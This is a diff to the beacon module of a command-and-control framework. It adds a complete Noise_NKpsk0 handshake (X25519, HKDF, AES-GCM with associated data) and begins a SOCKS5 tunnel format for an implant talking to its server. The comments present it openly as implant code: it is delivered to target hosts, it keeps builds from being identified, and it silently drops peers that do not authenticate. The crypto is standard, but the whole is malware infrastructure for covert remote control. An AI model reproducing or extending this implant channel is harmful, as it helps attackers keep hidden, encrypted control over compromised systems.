@@ -10,7 +10,9 @@ Zero external dependencies — stdlib only.
 import base64
 import ctypes
 import ctypes.util
+import errno
 import hashlib
+import hmac
 import io
 import json
 import logging
@@ -31,7 +33,7 @@ import urllib.error
 import zipfile
 import urllib.request
 from pathlib import Path
-from typing import Optional
+from typing import Callable, Iterable, Optional, Tuple
 
 logger = logging.getLogger("raccoon.c2")
 
@@ -289,14 +291,15 @@ def _aes_ctr_encrypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
     return bytes(out)
 
 
-def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
+def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
+                          aad: bytes = b"") -> bytes:
     """Pure-Python AES-256-GCM encrypt. Returns ciphertext + 16-byte tag."""
     # H = AES(key, 0^128)
     h = _aes256_block(key, b"\x00" * 16)
     # Encrypt with CTR (counter starts at 2)
     ct = _aes_ctr_encrypt(key, nonce, plaintext)
     # GHASH
-    ghash_val = _ghash(h, b"", ct)
+    ghash_val = _ghash(h, aad, ct)
     # Tag = GHASH XOR AES(key, nonce||0^31||1)
     j0 = nonce + b"\x00\x00\x00\x01"
     e_j0 = _aes256_block(key, j0)
@@ -304,7 +307,8 @@ def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
     return ct + tag
 
 
-def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
+def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
+                          aad: bytes = b"") -> bytes:
     """Pure-Python AES-256-GCM decrypt. Raises ValueError on auth failure."""
     if len(ciphertext_with_tag) < 16:
         raise ValueError("Ciphertext too short")
@@ -313,7 +317,7 @@ def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) 
     # H = AES(key, 0^128)
     h = _aes256_block(key, b"\x00" * 16)
     # Verify tag
-    ghash_val = _ghash(h, b"", ct)
+    ghash_val = _ghash(h, aad, ct)
     j0 = nonce + b"\x00\x00\x00\x01"
     e_j0 = _aes256_block(key, j0)
     expected_tag = _xor(ghash_val, e_j0)
@@ -371,9 +375,17 @@ EVP_CTRL_GCM_SET_TAG = 0x11
 GCM_TAG_LEN = 16
 
 
-def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
+def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
+                     aad: bytes = b"") -> bytes:
+    """AES-256-GCM. Returns ciphertext with the 16-byte tag appended.
+
+    `aad` is authenticated but not encrypted. It defaults to empty, which
+    is what the beacon's own channels use; the Noise handshake below needs
+    it, because Noise authenticates each handshake payload against the
+    running handshake hash.
+    """
     if _USE_PURE_PYTHON_AES:
-        return _pure_aes_gcm_encrypt(key, nonce, plaintext)
+        return _pure_aes_gcm_encrypt(key, nonce, plaintext, aad)
     ctx = _crypto.EVP_CIPHER_CTX_new()
     if not ctx:
         raise RuntimeError("EVP_CIPHER_CTX_new failed")
@@ -387,6 +399,10 @@ def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
             raise RuntimeError("EncryptInit_ex (key/iv) failed")
 
         outlen = ctypes.c_int(0)
+        # AAD goes in with a NULL output buffer, before any plaintext.
+        if aad and _crypto.EVP_EncryptUpdate(
+                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
+            raise RuntimeError("EncryptUpdate (aad) failed")
         out = ctypes.create_string_buffer(len(plaintext) + 16)
         if _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), plaintext, len(plaintext)) != 1:
             raise RuntimeError("EncryptUpdate failed")
@@ -407,9 +423,13 @@ def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
         _crypto.EVP_CIPHER_CTX_free(ctx)
 
 
-def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> bytes:
+def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
+                     aad: bytes = b"") -> bytes:
+    """The inverse of `_aes_gcm_encrypt`. Raises ValueError if the tag,
+    the key, the nonce or `aad` does not match what was encrypted.
+    """
     if _USE_PURE_PYTHON_AES:
-        return _pure_aes_gcm_decrypt(key, nonce, ciphertext_with_tag)
+        return _pure_aes_gcm_decrypt(key, nonce, ciphertext_with_tag, aad)
     if len(ciphertext_with_tag) < GCM_TAG_LEN:
         raise ValueError("Ciphertext too short")
     ct = ciphertext_with_tag[:-GCM_TAG_LEN]
@@ -428,6 +448,9 @@ def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> by
             raise RuntimeError("DecryptInit_ex (key/iv) failed")
 
         outlen = ctypes.c_int(0)
+        if aad and _crypto.EVP_DecryptUpdate(
+                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
+            raise RuntimeError("DecryptUpdate (aad) failed")
         out = ctypes.create_string_buffer(len(ct) + 16)
         if _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), ct, len(ct)) != 1:
             raise RuntimeError("DecryptUpdate failed")
@@ -446,6 +469,1080 @@ def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes) -> by
         return out.raw[:pt_len]
     finally:
         _crypto.EVP_CIPHER_CTX_free(ctx)
+
+
+# ── X25519 key agreement via OpenSSL ctypes ──
+
+_X25519_KEY_LEN = 32
+# obj_mac.h. X25519 has no EVP_PKEY_CTX_new_id of its own: the raw-key
+# constructors take the NID directly.
+_NID_X25519 = 1034
+# RFC 7748 §4.1: u = 9. A public key is the private scalar applied to it,
+# so the keypair needs no separate OpenSSL code path.
+_X25519_BASEPOINT = b"\x09" + b"\x00" * 31
+
+# The raw-key API arrived in OpenSSL 1.1.1. An older libcrypto loads and
+# serves AES-256-GCM perfectly well, so this flag is its own measurement
+# and not a copy of _USE_PURE_PYTHON_AES -- and it is read at call time,
+# so a test can force either backend.
+_USE_PURE_PYTHON_X25519 = (
+    _crypto is None
+    or not hasattr(_crypto, "EVP_PKEY_new_raw_private_key")
+    or not hasattr(_crypto, "EVP_PKEY_derive"))
+
+if not _USE_PURE_PYTHON_X25519:
+    _crypto.EVP_PKEY_new_raw_private_key.argtypes = [
+        ctypes.c_int, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_size_t,
+    ]
+    _crypto.EVP_PKEY_new_raw_private_key.restype = ctypes.c_void_p
+    _crypto.EVP_PKEY_new_raw_public_key.argtypes = [
+        ctypes.c_int, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_size_t,
+    ]
+    _crypto.EVP_PKEY_new_raw_public_key.restype = ctypes.c_void_p
+    _crypto.EVP_PKEY_free.argtypes = [ctypes.c_void_p]
+    _crypto.EVP_PKEY_CTX_new.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
+    _crypto.EVP_PKEY_CTX_new.restype = ctypes.c_void_p
+    _crypto.EVP_PKEY_CTX_free.argtypes = [ctypes.c_void_p]
+    _crypto.EVP_PKEY_derive_init.argtypes = [ctypes.c_void_p]
+    _crypto.EVP_PKEY_derive_init.restype = ctypes.c_int
+    _crypto.EVP_PKEY_derive_set_peer.argtypes = [
+        ctypes.c_void_p, ctypes.c_void_p,
+    ]
+    _crypto.EVP_PKEY_derive_set_peer.restype = ctypes.c_int
+    _crypto.EVP_PKEY_derive.argtypes = [
+        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t),
+    ]
+    _crypto.EVP_PKEY_derive.restype = ctypes.c_int
+
+
+# ── Pure-Python X25519 (stdlib only, no ctypes) ──
+# Used as fallback when libcrypto is unavailable or predates the raw-key
+# API. Not constant-time -- the conditional swap below is a Python `if`,
+# as the pure AES above is also not constant-time. Both are a fallback
+# for a host that denies us libcrypto, not a claim of side-channel
+# resistance; the key is ephemeral and used for one handshake.
+
+_X25519_P = 2 ** 255 - 19
+_X25519_A24 = 121665
+
+
+def _x25519_clamp(scalar: bytes) -> int:
+    """The scalar as RFC 7748 §5 decodes it: low three bits and the top
+    bit cleared, bit 254 set. Clearing the low bits confines the result to
+    the prime-order subgroup; setting bit 254 fixes the ladder's length.
+    """
+    k = bytearray(scalar)
+    k[0] &= 248
+    k[31] &= 127
+    k[31] |= 64
+    return int.from_bytes(k, "little")
+
+
+def _pure_x25519(private: bytes, peer_public: bytes) -> bytes:
+    """Pure-Python X25519. The RFC 7748 §5 Montgomery ladder verbatim.
+
+    255 iterations from bit 254 down, each a conditional swap followed by
+    one differential add-and-double, then a single inversion by Fermat's
+    little theorem. The top bit of the u-coordinate is masked off before
+    use, which RFC 7748 §5 requires of every receiver.
+    """
+    p = _X25519_P
+    k = _x25519_clamp(private)
+    x1 = int.from_bytes(peer_public, "little") & ((1 << 255) - 1)
+    x2, z2, x3, z3, swap = 1, 0, x1, 1, 0
+    for t in range(254, -1, -1):
+        k_t = (k >> t) & 1
+        swap ^= k_t
+        if swap:
+            x2, x3 = x3, x2
+            z2, z3 = z3, z2
+        swap = k_t
+        a = (x2 + z2) % p
+        aa = (a * a) % p
+        b = (x2 - z2) % p
+        bb = (b * b) % p
+        e = (aa - bb) % p
+        c = (x3 + z3) % p
+        d = (x3 - z3) % p
+        da = (d * a) % p
+        cb = (c * b) % p
+        x3 = pow(da + cb, 2, p)
+        z3 = (x1 * pow(da - cb, 2, p)) % p
+        x2 = (aa * bb) % p
+        z2 = (e * (aa + _X25519_A24 * e)) % p
+    if swap:
+        x2, x3 = x3, x2
+        z2, z3 = z3, z2
+    shared = (x2 * pow(z2, p - 2, p)) % p
+    return shared.to_bytes(_X25519_KEY_LEN, "little")
+
+
+def _x25519_keypair() -> Tuple[bytes, bytes]:
+    """A fresh (private, public) X25519 keypair, 32 bytes each.
+
+    The private key is 32 random bytes as RFC 7748 §6.1 specifies;
+    clamping happens inside the scalar multiplication, so there is nothing
+    to normalise here. The public key is derived through whichever backend
+    is active, which keeps a keypair from one backend usable by the other.
+    """
+    private = os.urandom(_X25519_KEY_LEN)
+    return private, _x25519(private, _X25519_BASEPOINT)
+
+
+def _x25519(private: bytes, peer_public: bytes) -> bytes:
+    """The 32-byte X25519 shared secret for `private` and `peer_public`.
+
+    Both arguments must be exactly 32 bytes: a short or long key is a
+    framing bug upstream, and the ladder would otherwise reinterpret it
+    and return a secret the far end cannot reach. An all-zero result means
+    the peer sent a low-order point, which yields a shared secret an
+    attacker already knows; OpenSSL refuses to derive one and so does the
+    pure path, so the two backends agree on the rejection too.
+    """
+    if len(private) != _X25519_KEY_LEN:
+        raise ValueError("X25519 private key is %d bytes; it must be "
+                         "exactly %d" % (len(private), _X25519_KEY_LEN))
+    if len(peer_public) != _X25519_KEY_LEN:
+        raise ValueError("X25519 peer public key is %d bytes; it must be "
+                         "exactly %d" % (len(peer_public), _X25519_KEY_LEN))
+
+    if _USE_PURE_PYTHON_X25519:
+        shared = _pure_x25519(private, peer_public)
+        if shared == b"\x00" * _X25519_KEY_LEN:
+            raise ValueError("X25519 derivation failed — peer public key "
+                             "is a low-order point")
+        return shared
+
+    pkey = _crypto.EVP_PKEY_new_raw_private_key(
+        _NID_X25519, None, private, len(private))
+    if not pkey:
+        raise RuntimeError("EVP_PKEY_new_raw_private_key failed")
+    peer = None
+    ctx = None
+    try:
+        peer = _crypto.EVP_PKEY_new_raw_public_key(
+            _NID_X25519, None, peer_public, len(peer_public))
+        if not peer:
+            raise RuntimeError("EVP_PKEY_new_raw_public_key failed")
+        ctx = _crypto.EVP_PKEY_CTX_new(pkey, None)
+        if not ctx:
+            raise RuntimeError("EVP_PKEY_CTX_new failed")
+        if _crypto.EVP_PKEY_derive_init(ctx) != 1:
+            raise RuntimeError("EVP_PKEY_derive_init failed")
+        if _crypto.EVP_PKEY_derive_set_peer(ctx, peer) != 1:
+            raise RuntimeError("EVP_PKEY_derive_set_peer failed")
+        outlen = ctypes.c_size_t(_X25519_KEY_LEN)
+        out = ctypes.create_string_buffer(_X25519_KEY_LEN)
+        if _crypto.EVP_PKEY_derive(ctx, out, ctypes.byref(outlen)) != 1:
+            raise ValueError("X25519 derivation failed — peer public key "
+                             "is a low-order point")
+        return out.raw[:outlen.value]
+    finally:
+        if ctx:
+            _crypto.EVP_PKEY_CTX_free(ctx)
+        if peer:
+            _crypto.EVP_PKEY_free(peer)
+        _crypto.EVP_PKEY_free(pkey)
+
+
+# ── HKDF, Noise's flavour ──
+
+def _hkdf(chaining_key: bytes, input_material: bytes,
+          num_outputs: int) -> Tuple[bytes, ...]:
+    """Noise §4.3 HKDF: `num_outputs` 32-byte keys from a chaining key.
+
+    This is RFC 5869 with the arguments Noise names and no `info`: the
+    chaining key is the salt, so `temp_key = HMAC(chaining_key, ikm)` is
+    RFC 5869's extract step, and each output is the expand step's next
+    block, `HMAC(temp_key, previous || i)`. Signature follows Noise rather
+    than RFC 5869 because the handshake state is what calls it -- with two
+    outputs after a DH, three when it also needs a handshake hash.
+    """
+    if num_outputs not in (2, 3):
+        raise ValueError("HKDF produces two or three outputs, not %r"
+                         % (num_outputs,))
+    temp_key = hmac.new(chaining_key, input_material, hashlib.sha256).digest()
+    outputs = []
+    previous = b""
+    for i in range(1, num_outputs + 1):
+        previous = hmac.new(temp_key, previous + bytes([i]),
+                            hashlib.sha256).digest()
+        outputs.append(previous)
+    return tuple(outputs)
+
+
+# ── Noise_NKpsk0_25519_AESGCM_SHA256 ──
+#
+# The Noise Protocol Framework, revision 34, for one pattern and one
+# cipher suite. `NK` means the responder's static public key is known to
+# the initiator in advance, as a pre-message, and the initiator has no
+# static key of its own -- which is what an implant wants: nothing in the
+# artifact identifies the build to a server it has not yet reached, and
+# nothing in the artifact lets a second implant impersonate the server.
+# `psk0` mixes a 32-byte pre-shared key in as the first token of the
+# first message, so an unauthenticated peer cannot produce a message the
+# responder will answer, and the responder has nothing to say to one.
+#
+#   NKpsk0:
+#     <- s
+#     ...
+#     -> psk, e, es
+#     <- e, ee
+#
+# Transport messages are capped at 65535 bytes including the 16-byte tag,
+# because the framing above this carries a `>H` length prefix.
+
+_NOISE_KEY_LEN = 32
+# Noise §5.1: the counter must never reach 2**64-1.
+_NOISE_MAX_NONCE = 2 ** 64 - 1
+
+_NOISE_START = "start"
+_NOISE_SENT_MESSAGE_ONE = "sent message 1"
+_NOISE_READ_MESSAGE_ONE = "read message 1"
+_NOISE_TRANSPORT = "transport"
+_NOISE_FAILED = "failed"
+
+
+def _noise_32_bytes(value, what: str) -> bytes:
+    """`value` as 32 bytes, or a ValueError naming `what` and the length.
+
+    Never names the value: every caller passes key material. Noise fixes
+    every key in this suite at 32 bytes, and HKDF would happily accept a
+    short one and produce a handshake that completed -- which is the worst
+    outcome available for a secret, so the length is checked where it
+    enters rather than where it fails.
+    """
+    if not isinstance(value, (bytes, bytearray)):
+        raise ValueError("%s must be 32 bytes, not %s"
+                         % (what, type(value).__name__))
+    if len(value) != _NOISE_KEY_LEN:
+        raise ValueError("%s is %d bytes; it must be exactly %d"
+                         % (what, len(value), _NOISE_KEY_LEN))
+    return bytes(value)
+
+
+class _CipherState:
+    """Noise §5.1 CipherState: one key and one 64-bit message counter.
+
+    AESGCM's nonce is 32 bits of zeroes followed by the counter
+    big-endian (Noise §12.3), so the counter is the whole of the replay
+    protection: there is no window and no reordering, which is what a
+    stream on top of TCP wants. A failed decryption does not advance it,
+    so a tampered or duplicated frame cannot desynchronise the honest
+    ones -- though Noise §5.1 requires the session be abandoned anyway.
+    """
+
+    def __init__(self, key: bytes):
+        self._key = key
+        self._nonce = 0
+
+    def _current_nonce(self) -> bytes:
+        if self._nonce >= _NOISE_MAX_NONCE:
+            raise ValueError(
+                "Noise cipher state is exhausted: the nonce reached "
+                "2**64-1, and reusing one under the same key would void "
+                "the cipher")
+        return b"\x00" * 4 + struct.pack(">Q", self._nonce)
+
+    def encrypt_with_ad(self, ad: bytes, plaintext: bytes) -> bytes:
+        out = _aes_gcm_encrypt(self._key, self._current_nonce(), plaintext,
+                               ad)
+        self._nonce += 1
+        return out
+
+    def decrypt_with_ad(self, ad: bytes, ciphertext: bytes) -> bytes:
+        out = _aes_gcm_decrypt(self._key, self._current_nonce(), ciphertext,
+                               ad)
+        self._nonce += 1
+        return out
+
+
+class _SymmetricState:
+    """Noise §5.2 SymmetricState: the chaining key, the handshake hash,
+    and the cipher state the two of them key.
+    """
+
+    def __init__(self, protocol_name: bytes):
+        # InitializeSymmetric pads a protocol name shorter than the hash
+        # with zeroes and hashes a longer one. This suite's name is
+        # exactly 32 bytes -- SHA-256's output length -- so `h` is the
+        # name verbatim and neither case can arise here.
+        self._h = protocol_name
+        self._ck = protocol_name
+        self._cipher = None
+
+    def handshake_hash(self) -> bytes:
+        return self._h
+
+    def mix_hash(self, data: bytes) -> None:
+        self._h = hashlib.sha256(self._h + data).digest()
+
+    def mix_key(self, input_material: bytes) -> None:
+        self._ck, temp_key = _hkdf(self._ck, input_material, 2)
+        self._cipher = _CipherState(temp_key)
+
+    def mix_key_and_hash(self, input_material: bytes) -> None:
+        self._ck, temp_h, temp_key = _hkdf(self._ck, input_material, 3)
+        self.mix_hash(temp_h)
+        self._cipher = _CipherState(temp_key)
+
+    # `psk` is the first token of the first message in psk0, so a cipher
+    # state always exists before either of these is reached. Noise's
+    # "return the plaintext unchanged when there is no key" case cannot
+    # arise in this pattern and is deliberately not implemented: a
+    # cleartext payload must never be a reachable outcome here.
+
+    def encrypt_and_hash(self, plaintext: bytes) -> bytes:
+        ciphertext = self._cipher.encrypt_with_ad(self._h, plaintext)
+        self.mix_hash(ciphertext)
+        return ciphertext
+
+    def decrypt_and_hash(self, ciphertext: bytes) -> bytes:
+        plaintext = self._cipher.decrypt_with_ad(self._h, ciphertext)
+        self.mix_hash(ciphertext)
+        return plaintext
+
+    def split(self) -> Tuple[_CipherState, _CipherState]:
+        first, second = _hkdf(self._ck, b"", 2)
+        return _CipherState(first), _CipherState(second)
+
+
+class NoiseSession:
+    """One side of one `Noise_NKpsk0_25519_AESGCM_SHA256` connection.
+
+    Built through `initiator()` or `responder()`, then driven in order:
+
+        initiator                         responder
+        ---------                         ---------
+        message_one = initiate(payload)
+                              -------->   payload = respond(message_one)
+        complete(message_two) <--------    message_two = reply()
+        encrypt() / decrypt()              encrypt() / decrypt()
+
+    `respond` hands back the first message's payload because that payload
+    is how the responder learns what kind of connection this is; it is
+    authenticated before it is returned, so a caller may dispatch on it.
+    `reply` exists because something has to produce message 2, and the
+    responder cannot produce it until it has read message 1.
+
+    `encrypt` returns the bare Noise message. The `>H` length prefix is
+    the framing layer's, not this one's.
+
+    A call in the wrong order raises RuntimeError; a peer that fails to
+    authenticate, or a message that is malformed or tampered with, raises
+    ValueError. The two are kept distinct on purpose: the tunnel server
+    catches ValueError to mean "this peer is not ours, say nothing and
+    close", and must not swallow its own sequencing bugs with it.
+    """
+
+    PROTOCOL_NAME = b"Noise_NKpsk0_25519_AESGCM_SHA256"
+    # Noise's own cap, and the one the `>H` length prefix above this can
+    # express. The tag is inside it, so the plaintext ceiling is 65519.
+    MAX_MESSAGE_LEN = 65535
+    MAX_PAYLOAD_LEN = MAX_MESSAGE_LEN - GCM_TAG_LEN
+
+    def __init__(self, is_initiator: bool,
+                 static_public: Optional[bytes] = None,
+                 static_private: Optional[bytes] = None,
+                 psk: Optional[bytes] = None,
+                 psk_lookup: Optional[Callable[[], Iterable[bytes]]] = None,
+                 prologue: bytes = b""):
+        self._is_initiator = bool(is_initiator)
+        self._prologue = prologue
+        self._psk_lookup = psk_lookup
+        self._stage = _NOISE_START
+        self._e_private = None
+        self._e_public = None
+        self._re = None
+        self._send = None
+        self._recv = None
+        # The PSK that authenticates this connection. Known from the start
+        # on the initiator, and only after `respond` on the responder,
+        # which has to find out which of several it is -- the caller reads
+        # it back to map the connection to the build it belongs to.
+        self.psk = None
+        # Noise's GetHandshakeHash, available once the handshake is done.
+        self.handshake_hash = None
+        if self._is_initiator:
+            self._static_private = None
+            self._static_public = _noise_32_bytes(
+                static_public, "Noise responder static public key")
+            self.psk = _noise_32_bytes(psk, "Noise pre-shared key")
+        else:
+            self._static_private = _noise_32_bytes(
+                static_private, "Noise responder static private key")
+            # NK's pre-message is the responder's static public key, which
+            # the responder therefore has to derive from its own private
+            # one rather than being handed both.
+            self._static_public = _x25519(self._static_private,
+                                          _X25519_BASEPOINT)
+        self._sym = self._initial_symmetric()
+
+    @classmethod
+    def initiator(cls, server_public: bytes, psk: bytes,
+                  prologue: bytes = b"") -> "NoiseSession":
+        """The implant's side: the server's static public key and one PSK,
+        both baked into the build.
+
+        `prologue` is empty in this deployment. It is a parameter because
+        the published Noise test vectors specify a non-empty one, and
+        replaying those vectors is the only check on this implementation
+        that does not come from this implementation.
+        """
+        return cls(True, static_public=server_public, psk=psk,
+                   prologue=prologue)
+
+    @classmethod
+    def responder(cls, static_private: bytes,
+                  psk_lookup: Callable[[], Iterable[bytes]],
+                  prologue: bytes = b"") -> "NoiseSession":
+        """The server's side: its static private key, and a callable that
+        returns the PSKs it is willing to accept.
+
+        A lookup rather than one key because a deployment holds one PSK
+        per build and cannot know which build a connection belongs to
+        until the connection authenticates. It is called once per
+        handshake, and the list it returns is the whole bound on the work
+        an unauthenticated peer can cause.
+        """
+        return cls(False, static_private=static_private,
+                   psk_lookup=psk_lookup, prologue=prologue)
+
+    # ── The handshake ──
+
+    def initiate(self, payload: bytes = b"") -> bytes:
+        """Message 1, `psk, e, es`, carrying `payload`."""
+        self._require(True, _NOISE_START, "initiate")
+        self._check_payload_fits(payload, _NOISE_KEY_LEN)
+        sym = self._sym
+        sym.mix_key_and_hash(self.psk)
+        public = self._ephemeral_public()
+        sym.mix_hash(public)
+        # Noise §9: in a PSK handshake the ephemeral is mixed into the
+        # chaining key as well as the hash. That is what makes two first
+        # messages with the same PSK and the same payload differ in every
+        # byte rather than only in the ephemeral.
+        sym.mix_key(public)
+        sym.mix_key(_x25519(self._e_private, self._static_public))
+        message = public + sym.encrypt_and_hash(payload)
+        self._stage = _NOISE_SENT_MESSAGE_ONE
+        return message
+
+    def respond(self, message: bytes) -> bytes:
+        """Read message 1 and return its payload, authenticated.
+
+        Each PSK the lookup offers is tried until one authenticates the
+        message. Every failure is a GCM tag failure and nothing else: the
+        work per candidate is two HKDFs and one tag check, and the one
+        Diffie-Hellman the message needs does not depend on the PSK, so it
+        is done once. A candidate that is not 32 bytes raises rather than
+        being skipped -- a malformed key in the store is a configuration
+        fault, and silently excluding it would turn it into a build that
+        mysteriously cannot connect.
+        """
+        self._require(False, _NOISE_START, "respond")
+        self._check_message_length(message, "message 1")
+        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
+        ciphertext = bytes(message[_NOISE_KEY_LEN:])
+        # From here the session is spent whatever happens: a peer gets one
+        # attempt, and a failure leaves nothing a caller could retry on.
+        self._stage = _NOISE_FAILED
+        candidates = [_noise_32_bytes(psk, "Noise pre-shared key")
+                      for psk in self._psk_lookup()]
+        if not candidates:
+            raise ValueError(
+                "no pre-shared keys to try: a responder with no registered "
+                "build cannot authenticate anybody")
+        shared = _x25519(self._static_private, remote_ephemeral)
+        for psk in candidates:
+            sym = self._initial_symmetric()
+            sym.mix_key_and_hash(psk)
+            sym.mix_hash(remote_ephemeral)
+            sym.mix_key(remote_ephemeral)
+            sym.mix_key(shared)
+            try:
+                payload = sym.decrypt_and_hash(ciphertext)
+            except ValueError:
+                continue
+            self._sym = sym
+            self._re = remote_ephemeral
+            self.psk = psk
+            self._stage = _NOISE_READ_MESSAGE_ONE
+            return payload
+        raise ValueError(
+            "Noise message 1 did not authenticate under any of the %d "
+            "pre-shared keys offered" % len(candidates))
+
+    def reply(self, payload: bytes = b"") -> bytes:
+        """Message 2, `e, ee`, carrying `payload`. Completes this side."""
+        self._require(False, _NOISE_READ_MESSAGE_ONE, "reply")
+        self._check_payload_fits(payload, _NOISE_KEY_LEN)
+        sym = self._sym
+        public = self._ephemeral_public()
+        sym.mix_hash(public)
+        sym.mix_key(public)
+        sym.mix_key(_x25519(self._e_private, self._re))
+        message = public + sym.encrypt_and_hash(payload)
+        self._split()
+        return message
+
+    def complete(self, message: bytes) -> None:
+        """Read message 2 and move to transport.
+
+        The pattern allows message 2 a payload, which this API has no use
+        for: it is authenticated, mixed into the handshake hash, and
+        dropped. Nothing downstream may read an unauthenticated byte, so
+        there is no path that returns it un-checked.
+        """
+        self._require(True, _NOISE_SENT_MESSAGE_ONE, "complete")
+        self._check_message_length(message, "message 2")
+        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
+        self._stage = _NOISE_FAILED
+        sym = self._sym
+        sym.mix_hash(remote_ephemeral)
+        sym.mix_key(remote_ephemeral)
+        sym.mix_key(_x25519(self._e_private, remote_ephemeral))
+        sym.decrypt_and_hash(bytes(message[_NOISE_KEY_LEN:]))
+        self._split()
+
+    # ── Transport ──
+
+    def encrypt(self, plaintext: bytes) -> bytes:
+        """One transport message, unframed."""
+        self._require(None, _NOISE_TRANSPORT, "encrypt")
+        self._check_payload_fits(plaintext, 0)
+        return self._send.encrypt_with_ad(b"", plaintext)
+
+    def decrypt(self, ciphertext: bytes) -> bytes:
+        """The plaintext of one transport message, or a ValueError.
+
+        A frame that is tampered with, truncated, replayed or arrives out
+        of order all fail here, because the counter is the only sequence
+        number the protocol has.
+        """
+        self._require(None, _NOISE_TRANSPORT, "decrypt")
+        if len(ciphertext) > self.MAX_MESSAGE_LEN:
+            raise ValueError(
+                "transport message is %d bytes; a Noise message is at most "
+                "%d" % (len(ciphertext), self.MAX_MESSAGE_LEN))
+        return self._recv.decrypt_with_ad(b"", ciphertext)
+
+    # ── Internals ──
+
+    def _initial_symmetric(self) -> _SymmetricState:
+        """A SymmetricState with the prologue and the pre-message mixed in.
+
+        Rebuilt rather than copied for each PSK the responder tries: it is
+        two SHA-256 calls, where a copy would have to be deep to be safe.
+        """
+        sym = _SymmetricState(self.PROTOCOL_NAME)
+        sym.mix_hash(self._prologue)
+        # NK's pre-message, `<- s`. Both ends mix it before the first
+        # message, so an initiator aimed at the wrong server fails on the
+        # first tag rather than somewhere later and less legibly.
+        sym.mix_hash(self._static_public)
+        return sym
+
+    def _ephemeral_public(self) -> bytes:
+        if self._e_private is None:
+            self._e_private, self._e_public = _x25519_keypair()
+        return self._e_public
+
+    def _fix_ephemeral(self, private: bytes) -> None:
+        """Pin the ephemeral keypair instead of generating one.
+
+        A test seam, and the only way to replay a published test vector,
+        which specifies both ephemerals. Production must never call it: an
+        ephemeral reused across two handshakes reuses the transport keys
+        with it.
+        """
+        if self._stage != _NOISE_START:
+            raise RuntimeError("the ephemeral key is already in use")
+        self._e_private = _noise_32_bytes(private,
+                                          "Noise ephemeral private key")
+        self._e_public = _x25519(self._e_private, _X25519_BASEPOINT)
+
+    def _split(self) -> None:
+        first, second = self._sym.split()
+        # Noise §5.3: the initiator sends under the first key and receives
+        # under the second; the responder has them the other way round.
+        if self._is_initiator:
+            self._send, self._recv = first, second
+        else:
+            self._send, self._recv = second, first
+        self.handshake_hash = self._sym.handshake_hash()
+        self._stage = _NOISE_TRANSPORT
+
+    def _role(self) -> str:
+        return "initiator" if self._is_initiator else "responder"
+
+    def _require(self, is_initiator, stage: str, call: str) -> None:
+        """Refuse a call this session is not at. `is_initiator` None means
+        either role may make it.
+        """
+        if is_initiator is not None and bool(is_initiator) != self._is_initiator:
+            raise RuntimeError(
+                "%s() is the %s's call and this session is the %s"
+                % (call, "initiator" if is_initiator else "responder",
+                   self._role()))
+        if self._stage != stage:
+            raise RuntimeError(
+                "%s() cannot run now: this %s session is at %r, not %r"
+                % (call, self._role(), self._stage, stage))
+
+    def _check_payload_fits(self, payload: bytes, overhead: int) -> None:
+        limit = self.MAX_PAYLOAD_LEN - overhead
+        if len(payload) > limit:
+            raise ValueError(
+                "payload is %d bytes; at most %d fits here, because the "
+                "message and its %d-byte tag together must not exceed %d"
+                % (len(payload), limit, GCM_TAG_LEN, self.MAX_MESSAGE_LEN))
+
+    def _check_message_length(self, message: bytes, what: str) -> None:
+        shortest = _NOISE_KEY_LEN + GCM_TAG_LEN
+        if len(message) < shortest:
+            raise ValueError(
+                "Noise %s is %d bytes; the shortest valid one is %d, being "
+                "a %d-byte ephemeral key, an empty payload and a %d-byte "
+                "tag" % (what, len(message), shortest, _NOISE_KEY_LEN,
+                         GCM_TAG_LEN))
+        if len(message) > self.MAX_MESSAGE_LEN:
+            raise ValueError(
+                "Noise %s is %d bytes; a Noise message is at most %d"
+                % (what, len(message), self.MAX_MESSAGE_LEN))
+
+
+# ── Tunnel wire format: framing, command messages and SOCKS5 ──
+
+# The wire, outermost first:
+#
+#   frame           = ">H" length + one Noise message
+#   command message = kind(1) + compact JSON object        (inside Noise)
+#   SOCKS request   = ver(1)=5 cmd(1) rsv(1)=0 atyp(1) addr port(">H")
+#   SOCKS reply     = ver(1)=5 rep(1) rsv(1)=0 atyp(1) addr port(">H")
+#
+# Every number here is big-endian and every reserved field is present and
+# checked, per RFC 1928. Both choices are deliberate and neither is free,
+# so the reasons are written down -- in
+# `software/c2/tunnel/protocol.py` and in docs/TUNNEL.md, and not here.
+# This file is read verbatim into every delivered artifact, so a comment
+# in it is a comment on the host, and the only comments worth putting on
+# a host are the ones a maintainer of *this* code needs. An empty frame,
+# which is the bytes `00 00` exactly, is refused by both `write_frame`
+# and `read_frame` for a reason recorded in the same two places.
+#
+# This section lives in `beacon.py` because `api_beacon_gen` reads exactly
+# this one file to build the artifact the tunnel endpoint runs from. A
+# helper in another module would pass every test here and be absent on
+# target. `software/c2/tunnel/protocol.py` re-exports these names for the
+# server side; it holds no second copy.
+#
